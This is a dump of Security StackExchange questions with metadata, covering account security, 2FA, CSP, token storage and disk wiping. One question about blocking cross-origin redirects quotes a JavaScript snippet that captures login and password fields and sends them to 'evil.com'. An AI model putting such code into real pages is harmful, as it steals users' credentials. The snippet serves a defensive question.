<li>to create hashes of files for <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"" rel=""nofollow noreferrer"">CSP script-src integrity</a></li>
</ul>
<p>Are there any implications by this?</p>
","152991","","","","","2023-08-25 08:29:23","Implications of SHA256 implementation producing false / unexpected hashes","<web-application><sha256><content-security-policy><node.js>","1","0","","","","CC BY-SA 4.0"
"200655","1","","","2019-01-01 22:33:10","","1","304","<pre><code>define('SECURE_AUTH_KEY', 
define('AUTH_KEY',        
define('LOGGED_IN_KEY',    
define('NONCE_KEY',        
define('AUTH_SALT',        
define('SECURE_AUTH_SALT', 
define('LOGGED_IN_SALT',   
define('NONCE_SALT', 
</code></pre>

<p>This is what my wp-config.php file contains
And I saw from access logs It was accessed about 20 times from other ips.</p>

<p>What to do? Can they compromise my wp data?</p>
","194637","","106285","","2019-01-02 04:49:58","2019-01-02 04:49:58","wp-config leaked, how to change salts","<account-security><wordpress>","1","5","","2019-01-06 16:17:12","","CC BY-SA 4.0"
"135720","1","135727","","2016-09-02 17:07:44","","1","114","<p>I have a Synology NAS running in a SOHO network and I'd like to maintain it secure. First thing I did was disable the default admin and guest accounts, second I created some accounts and this is what I currently have:</p>

<ul>
<li>Bob (this is me): admin + user roles</li>
<li>Charlie: user role</li>
<li>Dana: user role</li>
</ul>

<p>I use the account <code>Bob</code> on a daily basis and I don't like the idea of using an admin account this way so I was thinking about creating a new admin user that will only be controlled by me and have the following structure:</p>

<ul>
<li>Poseidon (this is me): admin role</li>
<li>Bob (this is me): user role</li>
<li>Charlie: user role</li>
<li>Dana: user role</li>
</ul>

<p>Is this the right way to handle the situation?</p>
","93194","","","","","2016-09-02 18:00:53","Should I have two accounts in my NAS (ex.: Bob as user and Poseidon as admin, both controlled by me)?","<account-security><user-management>","1","0","","","","CC BY-SA 3.0"
"200939","1","","","2019-01-07 04:21:27","","1","746","<p>Is it possible to somehow get 2FA for my e-mail accounts even if they're hosted on custom / private domains? (e.g mymail@mycooldomain.com and not gmail)</p>
","193544","","","","","2019-01-08 20:26:03","Can I get 2FA for my private domain e-mail account?","<email><multi-factor><account-security>","3","1","","2019-01-09 06:33:20","","CC BY-SA 4.0"
"135912","1","","","2016-09-05 13:20:14","","6","22158","<p>For some reason, Google couldn't give me the answer easily...</p>

<p>I was reading a Google publication on the insecurity of currently deployed Content Security Policies (<a href=""http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf"" rel=""noreferrer"">CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy</a>) To understand fully, I want to be absolutely clear of all the terminology so whilst this may sound like a simple question, the answer will help with my learning of mitigating against XSS vulnerabilities.</p>
","106190","","72313","","2016-09-09 18:42:30","2016-09-09 18:42:30","What is an inline script?","<web-application><xss><vulnerability><content-security-policy>","2","1","","","","CC BY-SA 3.0"
"135978","1","","","2016-09-06 01:00:48","","1","1132","<p>My bank is a bit behind on their security protocol and they are finally initiating 2-step authentication for their online banking services. However, an authentication code can be sent only by text message, phone call, or email. I'm disappointed they will not permit the use of an authentication app, but it appears they have decided to forego this option, at least for now. Given the 3 options (text message, phone call, email), which is most secure when receiving authentication codes? </p>
","123491","","","","","2016-09-06 04:31:05","Two Step Authentication - Email versus Text Message versus Phone Call","<multi-factor><account-security>","2","0","","","","CC BY-SA 3.0"
"201006","1","","","2019-01-08 03:24:28","","1","166","<p>At my workplace, users on most workstations (Win7 and 10 blend) do not have local admin rights. As a technical team we often need this for software installs, and so the director gets called around to enter credentials. Not only is this painful for everyone involved, but Domain Admin privileges are used 100% of the time. We recently had a disgruntled employee try to do some damage on their way out of the company, and if they had access to this account (which really would have been trivial to do) the results could have been disastrous. </p>

<p>I want to explain and or demonstrate why this is <em>such</em> bad practice, but a) I am a permanent casual employee (still at uni) and b) there is another department head who is very paranoid about a very outdated/misguided view of security, and I imagine they would take great offense. To top this all off, the IT service provider we are with is utterly incompetent, so even if this practice is not by their design, they certainly wouldn’t take any steps to prevent it. </p>

<p>Is it advisable to in any way approach either the director or my manager about why this is hopelessly insecure, or should I just bide my time and hope there is no incident while I am at the company. </p>

<p>For the record, IT support or admin is in no way shape or form a part of my job description, though I am well known in the office as the computer guy that can get things done. </p>
","196200","","","","","2019-01-08 08:27:45","My boss installs software using domain admin. Should I show that this is bad?","<authentication><account-security><user-management><domain-admin>","1","0","","","","CC BY-SA 4.0"
"201037","1","201051","","2019-01-08 16:00:45","","0","88","<p>On sites like Facebook etc. you have the ability to create ""private"" photo albums that are only shared with selected friends, similarly in Messenger you can upload an image just to a specific chat.</p>

<p>In the context of privacy and security on a social network, I'm assuming most people think these images etc. are secured. But are they?</p>

<p>Am I right in assuming that actually the security comes from the fact that an uploaded image just has some kind of extremely hard to guess <code>guid</code> that forms the url? The fact that an album is hidden, therefore projects the urls for it's contained images being seen, but if someone had the URL for a specific image they could view it regardless.</p>

<p>I know you can use scripts that generate an image (e.g a php script) whereby the image itself doesn't have an actual URL and is above the document root, but is more of <code>$_GET</code> parameter and the script could therefore enforce security. But something the scale of Facebook and Google where you would be relying on CDNs to deliver this content, a script handler for every image doesn't seem viable. </p>

<p>Am I right in assuming it's actually just security through obfuscation? Or do these sites employ some kind of sophisticated ACL to actually control access to individual images? How should this be handled in the context of social networks e.g more image based then truly sensitive files? (though obviously an image itself could be sensitive to the uploader)</p>
","41211","","","","","2019-01-08 19:27:19","media uploads and social sites group privacy etc","<web-application><privacy><account-security><image>","2","0","","","","CC BY-SA 4.0"
"136083","1","","","2016-09-07 04:14:41","","1","225","<p>I'm not sure if I'm allowed to post and have one of <a href=""https://unix.stackexchange.com/questions/308169/git-server-with-several-repos?noredirect=1#comment542011_308169"">my newly asked question</a> on both <strong>security.stackexchange</strong> and <strong>unix.stackexchange</strong> or not, but I think it is appropriate to ask the question here too since it's about security of using git server and configuring it in a secure way and not only about the typical configuration. So here is what I've faced with several problems during the configuration, and I'd be so grateful if anyone can help.</p>

<p>I'm setting up a git server, and there will be three different groups working on different projects <strong>iOS</strong>, <strong>WebDevel</strong>, <strong>Android</strong>. I need to do it in a secure/safe way.</p>

<p>Meanwhile, I don't want iOS developers to be able to change Android stuff, or vice versa. In other words, I want to restrict any group only to their own project. (Read permission is not an issue, but if you can tell me how I can restrict read permission too, I'll be thankful)</p>

<p>I need your help in configuring the server in a way that Developers can use pull/push/commit through SSH via their public key, but ONLY for their own project! Is there a way to jail them to their own project repo directory? For instance, is there a way to say whenever <code>X</code> user with the public key of <code>x_id_rsa.pub</code> or with the request of <code>git@mygitserver.com:~/git/iOS</code> trying to push or pull data, should be jailed to iOS and shouldn't be allowed to add any commit or anything else to other projects?</p>

<p>And the final question is that how can I use different types of policies for each repo directory by SELinux, and how much helpful can it be?</p>

<p>I'm using CentOS 7, please explain in details. I'm open to any suggestion, Thanks in advance.</p>
","118064","","-1","","2017-04-13 12:37:08","2017-04-11 08:33:13","Git Server with several repos","<authentication><linux><ssh><account-security><git>","0","6","","","","CC BY-SA 3.0"
"201240","1","","","2019-01-10 23:51:18","","2","868","<p>I created a secondary Facebook account months ago from Argentina. Now I logged back in, and noticed countless logins from RUSSIA and the account is clearly being used by some Russian dude.</p>

<p>I logged out from all devices, and changed the password, so far so good.</p>

<p><strong>But now I cannot login anymore from any device now because I'm asked to either</strong>:</p>

<ol>
<li>Login from a list of RUSSIAN devices I never used</li>
<li>Ask my fake RUSSIAN friends for help (I never added any friend)</li>
<li>Identify photos of fake RUSSIAN friends I never added.</li>
</ol>

<p><a href=""https://i.stack.imgur.com/If5N4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/If5N4.png"" alt=""enter image description here""></a></p>

<p><strong>This occurs even after resetting the password via Email</strong> (I do have access to the Email account), but <strong>Facebook prioritizes the fact that someone has been using the account from Russia over the ownership of the Email account itself</strong>. Yes this is actually happening, it's not a joke.</p>

<p>Could Mark Z. be more idiotic than this? They managed to use my compromised password to login from Russia and start adding friends, they happily deleted my verification phone number, <strong>and now I cannot even login or delete the account after resetting my password successfully?</strong></p>

<p>Note the Russian hacker never changed the password nor the email. It just deleted my phone number and it has been using the account almost everyday, logging in from supposedly ""<em>Samsung</em>"" and ""<em>Windows PC</em>"" devices from a supposed city identified as Perm, Russia. Is there some way to make Facebook aware about this idiocy? I know the account is probably lost forever now, but at least I'd like to delete it permanently.</p>
","196460","","","","","2019-01-10 23:59:35","Facebook security algorithm: Locked out of my own account after resetting password","<account-security><facebook><account-lockout>","1","0","","","","CC BY-SA 4.0"
"201353","1","","","2019-01-12 18:23:34","","5","267","<p>I love the idea of 2 factor authentication but how can I make sure I'm not caught in the wind without such keys?  I thought about switching to a fob for services that support it. Is there a fob that I can trust that provides a tiny display for keys? (like Google or Authy but without a phone)</p>

<p>I ask this because I stupidly reset my phone without triple checking there wasn't anything left to recover in order to fix software issues I had. I totally forgot I had set ""Multi-device"" to disabled in Authy and now I have to wait for them to reset my access. I want to try to make it hard for me to accidentally lose 2 factor auth access.</p>
","51901","","6253","","2019-01-14 10:00:57","2019-01-15 04:50:20","2 factor authentication, fob management","<multi-factor><account-security><persec>","2","0","","","","CC BY-SA 4.0"
"136334","1","","","2016-09-09 09:29:30","","1","520","<p>Is National Insurance number considered as something you have for 2 factor authentication as it is unique to each individual?</p>
","123866","","","","","2016-09-09 12:46:07","Is National Insurance number considered for 2 factor authentication","<passwords><account-security>","4","3","","","","CC BY-SA 3.0"
"136343","1","225801","","2016-09-09 11:23:54","","2","1278","<p>I've had Threema for a few days (a couple of friends forced me to buy it). It's pretty neat but I'm afraid that I'm not connected to everyone since my mail/phone-number data is pretty small or outdated.</p>

<p>So, I thought it would be a good idea to post my threema-id to Facebook and tell everyone: ""Hey if you want to connect your Threema, add me via 1F33OO7."" Is this a good idea? Would that negatively effect my security somehow?</p>
","81995","","5541","","2020-02-12 21:29:03","2022-09-15 16:03:48","Is it secure to make my Threema ID public?","<appsec><account-security><ids><threema>","5","0","","","","CC BY-SA 3.0"
"201415","1","","","2019-01-14 03:44:16","","2","210","<p>The title says it all basically. Even now, why is tampering IMEI possible at all? Shouldn't manufactures be using one time writable memory to embed IMEI into phones? Why don't they? </p>
","196495","","","","","2019-01-14 03:44:16","Why don't smartphone manufactures write the IMEI onto one time writable ROM so that it can't be tampered with?","<android><hardware><smartphone><security-by-design><imei>","0","14","","2019-01-14 09:23:40","","CC BY-SA 4.0"
"201457","1","","","2019-01-14 20:22:05","","4","188","<p>I'm building a website where you can register with an email account.</p>

<p>In your account private section you can find a form where you can change the email address to use when logging in. I wanted this form to send an email to the previous address in the form of ""You can no longer use this email address to log in here at blahblah.com, you have to use newaccount@mail.com.""</p>

<p>Can I tell to the previous email the new email address, or am I creating a vulnerability?</p>
","196801","","98538","","2019-01-15 07:51:42","2019-01-15 07:51:42","Should I inform the previous email account that it is no longer the main email address of my user?","<account-security>","2","0","","","","CC BY-SA 4.0"
"201499","1","","","2019-01-15 12:22:43","","0","87","<p>Let's say we're running Google Analytics, and we're tracking user specific data (or displaying contents based on that data, such as most recently viewed pages) -- we add a pixel, and then we pass the user data to the Analytics platform. What's to prevent a malicious user from passing a bunch of garbage data based on random user ids?</p>

<p>Same thing with mobile; let's say we integrate a customer service SDK such as Zendesk. There's usually either a key or a cert that we have to include in our apps. What's to stop a malicious user from decompiling our app and then using the provided cert in the app, read all user tickets from whatever user id he passes?</p>

<p>And what are things we can do, both as app/web developers and SDK developers to block these types of attacks?</p>
","12556","","","","","2019-01-15 12:57:25","How do JavaScript (and mobile) APIs keep user data clean?","<web-application><javascript><mobile><account-security><client-side>","1","0","","","","CC BY-SA 4.0"
"201566","1","","","2019-01-16 08:11:53","","73","16215","<p>Some websites display a remaining password retry count when I input wrong passwords more than twice. For example, displaying that there are 3 retries remaining until locking out my account. Is this dangerous from security perspective ?</p>
","194974","","132032","","2019-01-16 09:16:25","2019-01-21 03:27:41","Is displaying remaining password retry count a security risk?","<authentication><password-policy><account-security>","8","14","","","","CC BY-SA 4.0"
"201608","1","","","2019-01-16 18:36:12","","2","114","<p>I have a user which, when asked to create an IAM root user account, left the now disabled root key on the instance.</p>

<p>When asked to remove the root key, he said it's disabled now so what's the difference.</p>

<p>I don't want to get into a argument with this guy but was wondering if the community had any cogent thoughts about the impact of leaving a root key on the system when it's disabled?</p>

<p>Thanks!</p>
","197024","","","","","2019-01-16 19:42:58","What is the impact of leaving disabled root key on AWS instance?","<access-control><account-security><aws><root>","1","0","","","","CC BY-SA 4.0"
"136621","1","","","2016-09-12 16:46:41","","2","302","<p>I've worked on a Spring 4 MVC RESTful backend application.  We authenticate to an OpenAM server, and a lengthy token is stored in a cookie on the front-end.  The front-end takes the token out of the cookie, and passes it back as a header in every Ajax call to the back-end.  So, if we call the RESTful backend in an Ajax call (POST, PUT, GET), the token is sent as a header called ""openam_token.""</p>

<p>We have implemented Spring Web-Security based on the SiteHeader example.  A token comes in as a header and we have a PreAuthorizationFilter which we implemented called ""CustomUserDetailsService.""  This code takes the header, and gets the token, we pass that token to OpenAM to ask them if this is valid, and if so, returns us the username of that user.  From that unique username, we can lookup the user in the database and get the user details and their roles.</p>

<p>I presume that if I created a Login from Google+, LinkedIn, or Facebook, the process is the same.  We flip to their login page, the user gets authenticated and then a token comes back.   The token gets stored in a cookie on the client side.  Every Ajax call from that front-end to the backend passes back the token in the header,and then in CustomUserDetailsService ...we call LinkedIn, Google+, or Facebook, and see if the user is correct.   But this is on my presumption of how these work, but I could be completely wrong.</p>

<p>So, on the Spring RESTful app I am working on.  Usernames and passwords are stored in the database along with the salt.  I've done a lot of research on storing the salt with the username, a unique salt generated when the user is created or when they change their password.</p>

<p>So, provided a user provides a username and password, and the user has authenticated ... I want to generate a token for this user, and I am wondering on what the common practices are for generating a token?</p>

<p>Second,where is the best place to store that token?  If the token comes back, then I presume I can save that in a cookie on the client side as well, just like we do when we authenticate against OpenAM.   Now, what would be the best way to store those temporary tokens on the backend?   I could persist the token in the users table along with the user.  I could store those tokens in another table.   The idea is ... the tokens, stored in the cookies, need to match on the backend for that user with that token.   So, the question is on what a godd strategy for doing that.</p>

<p>I understand that I will never have the 100% most secured site, but I can take some common steps and do my due diligence.</p>

<p>Seems like an awful lot of explanation for something that seems like an easy question.</p>

<p>Thanks!</p>
","123897","","","","","2016-09-12 22:32:39","Authentication Token storing after database authentication","<token><account-security><spring-framework>","1","0","","","","CC BY-SA 3.0"
"201684","1","","","2019-01-17 20:48:35","","3","1405","<p>I've noticed if you do a password reset on iCloud, for example, it prompts you for your phone number before sending the SMS.</p>

<p>Since many people already know your phone number, or it may be listed publicly somewhere, why do websites do this? Is it just to add a small measure of security or to make the user feel good?</p>
","10574","","","","","2019-02-16 22:02:10","When websites use SMS as part of a password reset scheme, why do they ask for the user's phone number?","<account-security><phone><sms><password-reset>","3","2","","","","CC BY-SA 4.0"
"61750","1","","","2014-06-23 20:15:49","","8","11201","<p>My company uses a private PKI to handle such scenarios such as</p>

<ul>
<li>Mutual auth (TLS) to a website using client certificates</li>
<li>SSL web server certificates on an Intranet (once a VPN session is established.)</li>
<li>S/MIME secure email.</li>
<li>Activesync authentication </li>
</ul>

<p>When upgrading Android to Kitkat the presence of <a href=""http://geektaco.blogspot.com/2013/11/android-kitkat-network-may-be-monitored.html"" rel=""nofollow noreferrer"">a non-default root certificate</a> results in these warnings</p>

<p><img src=""https://i.stack.imgur.com/7nCMFm.png"" alt=""enter image description here""> and <img src=""https://i.stack.imgur.com/Ul8nZm.png"" alt=""enter image description here""></p>

<p>It is possible to remove this warning for a <a href=""http://www.samhobbs.co.uk/2013/12/remove-network-may-be-monitored-by-an-unknown-third-party-in-android-4-4-kitkat"" rel=""nofollow noreferrer"">root user</a>, or by uploading the certificate into Google Apps (and paying $5 per user/month), however I'm looking for a solution that does not incur this unnecessary cost.</p>

<p>Several people have posted this as a defect in the FOSS code, however the <a href=""https://code.google.com/p/android/issues/detail?id=62076"" rel=""nofollow noreferrer"">issue #62076</a> (starred by 121 people) has been closed as ""by design"".  <strong>Edit:</strong> This issue has been reopened in <a href=""https://code.google.com/p/android/issues/detail?id=82036"" rel=""nofollow noreferrer"">issue 82036</a> Please star it to vote as an issue, or comment as needed.</p>

<p>Through testing I verified that this error still appears when using Name Constraints, and limiting the EKU purpose of the new Root CA.  (S/MIME, client authentication, etc).</p>

<ul>
<li><p>Is there any way to add a certificate to the trusted roots on an Android phone that does not create this error? (in current or future version)</p></li>
<li><p>Are non-default trusted roots, in practice, more problematic than the default CA list (in other words is Google solving the wrong problem?)</p></li>
<li><p>Is it reasonable to allow a root cert that is properly constrained (at the root) by EKU usages, or Name Constraints to generate a different warning or set of approval dialogs?</p></li>
</ul>
","396","","396","","2016-08-19 11:21:30","2017-01-04 15:37:10","Android Kitkat reports: ""Network May Be Monitored by an Unknown Third Party"" when using non-default root CA","<tls><certificates><certificate-authority><android><security-theater>","2","1","","","","CC BY-SA 3.0"
"61859","1","61863","","2014-06-25 11:08:48","","3","22691","<p>Is it possible to white list an IP address in mod_security?</p>

<p>I found white ist whole domain name in mod_security. But I want to white list only the administrator IP. </p>

<p>OS: CentOS 6
Server: Apache httpd 2.15
Mod Security: Version 2.7</p>
","46285","","86652","","2016-07-01 02:18:02","2019-01-17 15:43:21","How to whitelist IP address mod_security CentOS 6","<mod-security><centos>","3","0","","","","CC BY-SA 3.0"
"201861","1","","","2019-01-20 23:43:23","","1","176","<p><a href=""https://security.stackexchange.com/questions/201210/why-is-gbt3fc79zmmefufj-a-weak-password"">I recently saw a post</a> asking why something that appeared to be a random string of characters was a bad password. One of the answers was that it already exists on a website so you can Google it by just searching the password. </p>

<p>More recently, I found out about <a href=""https://haveibeenpwned.com"" rel=""nofollow noreferrer"">Have I Been Pwned</a> which has a database of user information that has been breached in the past. On its <a href=""https://haveibeenpwned.com/Passwords"" rel=""nofollow noreferrer"">page about passwords</a>, I noticed the same thing that the person said on StackExchange:</p>

<blockquote>
  <p>This exposure makes them unsuitable for ongoing use as they're at much greater risk of being used to take over other accounts. </p>
</blockquote>

<p>Why does the password existing online make it unsafe? If I uploaded an infinitely large text file containing every password possible, would that make all passwords unsafe?</p>
","197366","","197366","","2019-01-21 00:28:19","2019-01-21 00:28:19","Why is it unsafe to use a password that exists online?","<passwords><account-security>","2","1","","","","CC BY-SA 4.0"
"201884","1","","","2019-01-21 12:05:29","","1","5681","<p>Following is a CSP policy, for example derived sample response headers.</p>

<p>The implementation below allows white-listed domains only in <code>""script-src""</code> directive but the <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> directives are also used next <code>'self'</code>.</p>

<p>Will this <code>'unsafe-inline'</code> / <code>'unsafe-eval'</code> be used by all white-listed domains including <code>'self'</code> or is it only for <code>'self'</code> domain?</p>

<pre><code>content-security-policy: 
script-src https://test1dummy.com/
 https://www.google.com/
 'self' 'unsafe-inline' 'unsafe-eval'
 https://test2dummy/
 https://test3dummy
</code></pre>
","180725","","192205","","2019-01-22 21:59:42","2021-09-13 17:59:15","CSP - Unsafe-inline or unsafe-eval for specific domain is allowed or not","<web-application><web-browser><xss><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"201934","1","201936","","2019-01-22 03:36:03","","0","85","<p>I am an Information security analyst, looking for creative, non traditional, and unapproved ways to query/evaluate DBMS applications that includes SQL Server and PostgreSQL. Goal here is to protect the organization that I work for from nefarious SQL injections or data leakage. I would appreciate if anybody can provide links to the documents/books/queries/tools that are applicable in current environment.</p>
","97279","","","","","2019-01-22 05:24:08","What would be the best way to evaulate the database management systems?","<sql-injection><databases><audit><account-security>","1","1","","2019-01-22 07:37:47","","CC BY-SA 4.0"
"136917","1","136923","","2016-09-16 01:16:16","","-2","1952","<p>So one of my laptops had a virus recently. I managed to remove it by running my computer in safe mode and then running my Antivirus software (norton). My laptop appears on be running fine now. </p>

<p>Should I feel ok checking my bank account and doing personal business items on it now? Or should I still be worried that a virus is there?</p>

<p>Computer is less than 2 years old. Barely used. Computer was acting funny and slower than usually so I brought it into safe mode and my Antivirus discovered the virus and removed it. </p>
","99332","","99332","","2016-09-16 01:38:48","2016-09-16 10:22:59","Is it safe to use a computer for banking etc after you have removed a virus from it?","<virus><antivirus><account-security><virus-removal>","2","2","","2016-09-16 07:21:50","","CC BY-SA 3.0"
"137042","1","","","2016-09-17 15:38:25","","2","1520","<p>My question is already partially answered <a href=""https://security.stackexchange.com/questions/101172/should-i-be-worried-if-i-accidentally-entered-my-password-in-a-username-field"">here</a>. However I would like to know if the answer would be any different considering the following circumstances:</p>

<p>When logging into a banking website the username box is accidentally clicked when typing the password so the latter half of the password is appended to the username before being submitted.</p>

<p>Considering the website is a banking website, and not the whole password is revealed, if something like the above scenario happened, although it would probably be advisable to change the password, would I get away with not doing so?</p>
","124666","","-1","","2017-03-17 13:14:43","2016-09-18 05:38:05","Accidentally typing part of password in username on secure website","<passwords><internet><banks><account-security>","2","1","","","","CC BY-SA 3.0"
"137119","1","137120","","2016-09-18 19:22:00","","1","86","<p>I am in the process of creating a web application that enables users to view all active sessions connected to their accounts and, if desired, delete them one by one individually.</p>
<p><a href=""https://i.stack.imgur.com/xFURh.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xFURh.png"" alt=""enter image description here"" /></a></p>
<p>One way I want to implement this is by sending links containing the actual <code>session_key</code> and embed them into the HTML like <code>https://www.example.com/session/delete/SESSION_KEY</code>.</p>
<p>Is this considered a good practice or is there a more efficient way to do this? Are there any risks that I am unaware of? Any guidance would be much appreciated.</p>
","102129","","102129","","2023-01-21 23:34:52","2023-01-21 23:34:52","Allow user to delete individual sessions on account, safe to embed sessions in HTML?","<session-management><account-security>","2","5","","","","CC BY-SA 4.0"
"62253","1","64480","","2014-07-02 00:34:29","","45","80910","<p>I'd like to wipe a stack of drives (spinning and SSD) securely. I'm familiar with the ATA Secure Erase (SE) command via <code>hdparm</code>, but I'm not sure if I should use the Security Erase (SE+) command instead.</p>
<p>There is <a href=""https://security.stackexchange.com/questions/41676/ata-security-erase-on-ssd"">some evidence</a> that these commands don't work on all drives. How can I ensure the drive is really wiped, including reserve areas, reallocated sectors, and the like?</p>
<p>I'm planning to use a Linux live CD (on USB). Ubuntu provides a workable live CD with which I can install <code>hdparm</code>, but is there a smaller live CD distro with updated software versions I should use instead?</p>
<p>So, in summary:</p>
<ol>
<li><p>What are the pros and cons of SE versus SE+?</p>
</li>
<li><p>How can I ensure the drive was truly and thoroughly wiped?</p>
</li>
<li><p>Which Linux distribution should I use?</p>
</li>
</ol>
","50241","","187989","","2023-08-24 13:58:59","2023-08-24 13:58:59","What is the difference between ATA Secure Erase and Security Erase? How can I ensure they worked?","<privacy><deletion><ata-security>","3","0","","","","CC BY-SA 4.0"
"202247","1","","","2019-01-26 20:41:17","","0","104","<p>How can I know that my Gmail is spoofed or sending spams to other people I sent email to them before? I don't have clear signs of that especially my contact list is empty but I'm afraid this may happen later as I clicked on a strange link in a mobile app.</p>
","197879","","6253","","2019-01-26 21:39:30","2019-02-25 22:01:20","Gmail Contact List Safety","<account-security><spam><gmail><email-spoofing>","1","0","","","","CC BY-SA 4.0"
"137284","1","","","2016-09-20 12:42:24","","0","158","<p>I am very very new in web development, and I need to make my website a little more secure by adding a simple <code>Content-Security-Policy</code> code.</p>

<p>Here are my questions:</p>

<ol>
<li><p>Is this line of code <code>Header set Content-Security-Policy ""default-src 'self'""</code> enough to prevent adding malicious codes by an unknown user/attacker?</p></li>
<li><p>To this code <code>Header set Content-Security-Policy ""default-src 'self'""</code> to work, all I need to do is input it in my <code>.htaccess</code> file ?</p></li>
</ol>
","124517","","8340","","2016-09-21 14:44:15","2016-09-21 14:44:15","Content Security Policy line of code for beginners","<content-security-policy>","1","2","","","","CC BY-SA 3.0"
"202598","1","202619","","2019-01-31 00:28:27","","1","222","<p>Some websites use Content-Security-Policy nonces in order to include inline styling and script in their webpages.</p>

<p>Is the CSP nonce feature designed to be used for production use, or is it simply there as a stop-gap solution in order to help facilitate the potentially long and complex transition to a fully locked down CSP?</p>
","169954","","","","","2019-01-31 06:37:56","Are Content-Security-Policy nonces designed for production use, or as a stop-gap when implementing a CSP?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"202613","1","","","2019-01-31 05:54:37","","2","776","<p>I have a Windows 10 Pro machine; the administrator (and only) account is a Microsoft account. I am trying to set up BitLocker to ensure maximum security and safety, even from Microsoft.</p>

<p>I understand that I can choose to disallow BitLocker from saving the recovery key to my Microsoft account.</p>

<p>However, does this option matter at all if my user account is a connected Microsoft account anyway? Microsoft already has my user account password. <strong>Couldn't Microsoft just use the actual password (which it has) to decrypt the data (given access to the physical drive) instead of the recovery key?</strong></p>
","161744","","6253","","2020-02-25 10:45:12","2020-02-25 10:45:12","BitLocker Recovery Key and Microsoft Account Password","<encryption><account-security><bitlocker>","2","0","","","","CC BY-SA 4.0"
"202676","1","","","2019-01-31 17:34:27","","1","5902","<p>I received an email entitled : 'Critical security alert for your linked Google Account' .. The body says:</p>

<blockquote>
  <p>Someone knows the password to your linked Google Account</p>
  
  <p>----------@gmail.com</p>
  
  <p>Google has become aware that someone else knows your password, and
  we've taken steps to protect your account. Please sign back into your
  account now and choose a new password to secure your account.</p>
</blockquote>

<p>I've removed the account name. I do not recognize this account so it should not be linked to my account. I did change my password immediately after receiving this email though it looks like it's saying that someone knows the unknown address' password.  I checked the headers on the email that I received and they indeed appear to be coming from Google and were not spoofed. The links in the email also go directly to Google's site for all links so the email seems legitimate.</p>

<p>In full disclosure, a trojan was run on my computer recently. At that time I did turn on 2FA for my gmail account and changed passwords on some of my saved google passwords. I am uncertain if this is related to the trojan.</p>

<p>Can a trojan pull my saved Google/Chrome password file? Is there a way to see what accounts my gmail may be linked to?</p>
","198370","","","","","2019-01-31 17:41:11","'Critical security alert for your linked Google Account ' but I don't recognize the account","<email><google><account-security>","1","0","","","","CC BY-SA 4.0"
"202767","1","202768","","2019-02-02 03:19:56","","1","134","<p>Lately, I’ve been paying $100 a month for Fios. I’m thinking of canceling this service because I rarely use my internet at home, since I’m at school most of the time and my college offers internet (both Wi-Fi and grounded). However, I’d still like a way to do my online banking, which can take several hours, at times, for me to finish with. Apart from WiFi, where else may I go to perhaps rent out a cabin with a grounded Ethernet connection for a couple of hours throughout the week? I was considering simply going to an internet cafe, but how can I be sure these internet cafes won’t be sniffing or logging my personal data? Is my personal home internet, which is behind a wired router, really the safest route for the time being? </p>
","180097","","","","","2019-02-02 10:10:56","Where would I go to use a reliably secure encrypted internet connection?","<account-security><keyloggers><ipsec><banks>","2","0","","","","CC BY-SA 4.0"
"202827","1","202829","","2019-02-03 14:45:17","","24","7599","<p>We are developing a kind of social platform. It starts as a closed beta for a limited number of users, but the goal is to reach millions of subscriptions.</p>

<p>We are currently limited on resources, both infrastructure and e.g. DevOps. So we are using GitLab for versioning our source code.</p>

<p>Let's assume, we make it and in few years the service has million users. How do you feel about using GitLab for versioning of the source code at this stage?
Do you see it as a significant security threat? A few reasons to consider:</p>

<ul>
<li>there is no possible real warranty that staff from GitLab cannot investigate the source and find security holes or some sensitive configuration.</li>
<li>GitLab staff could sell sourcecode to some third party</li>
<li>GitLab may be forced to provide the sourcecode to some government, without us to know it</li>
</ul>

<p>I know the points will sound paranoid. The purpose of the network is completely legal and ethical, but I believe any service of this kind must protect the privacy of its users. The plan is to move to our private servers later, but we have to start somehow.</p>

<p>So, do you think it is OK to use private GitLab or Bitbucket repositories for the early phase of the project, or is it an unacceptable security threat?</p>

<p>Disclaimer: I don't claim GitLab would do anything of the described.</p>
","198583","","1271","","2019-02-04 08:21:01","2019-09-03 16:10:36","Can I trust public code versioning platforms when building a social platform?","<secure-coding><content-security-policy>","4","11","","","","CC BY-SA 4.0"
"202887","1","202894","","2019-02-04 11:18:46","","1","172","<p>I am working in QA field and we have a project about a famous booking website.</p>

<p>I have discovered that if I create an account with the same name, surname and date of birth of an already registered account, I am able to see the personal page of the latter. This means that I can see his phone number, address and bookings. </p>

<p>Moreover, if I modify these fields also the settings of the original account will be modified. This means that I can also block another account by registering mine on a different market, because this will change its Country field and prevents him from logging from its market.</p>

<p>I have pointed out this behavior but I only got a ""works as intended"" answer. </p>

<p>Is this a severe security issue or it is just me? Thank you.</p>
","198649","","","","","2019-02-04 12:29:46","Account identified only by name, surname and date of birth","<authentication><account-security><websites>","1","4","","","","CC BY-SA 4.0"
"202987","1","","","2019-02-05 09:18:21","","2","9296","<p>Following <a href=""https://security.stackexchange.com/questions/200190/prevent-javascript-cross-origin-write"">this question</a>, is there a way to prevent this code from redirecting users to domains not whitelisted?</p>

<pre><code>const form = document.getElementsByTagName('form')[0];

form.addEventListener('submit', stealCredentials);

function stealCredentials() {
    const login = document.getElementsByName('login')[0].value;
    const password = document.getElementsByName('password')[0].value;

    window.location.href = 'http://evil.com/?login=' + login + '&amp;password=' + password
}
</code></pre>

<p>Is there a clean way to do it? Like Content Security Policy or something similar?</p>
","183814","","","","","2019-02-06 20:28:06","Prevent javascript cross-origin redirect by window.location.href","<xss><javascript><content-security-policy>","2","0","","","","CC BY-SA 4.0"
"203330","1","","","2019-02-10 22:51:27","","2","221","<p>I'm tossing an idea around in my mind. I want to bounce it off the community to see if this holds any water.</p>

<p>First - the OWASP guidelines never specify any method of action when you're dealing with registrations and password resets. Obviously this has come up a few times in several forums - including stackexchange.</p>

<p>So the problem is really the question of how much security are you willing to sacrifice to keep the frustration level of the user experience low.
After an admittedly superficial mental review of the problem, I'm wondering a few things.</p>

<p>Let's set the stage with example.com, who follow the existing OWASP recommendations to the T.</p>

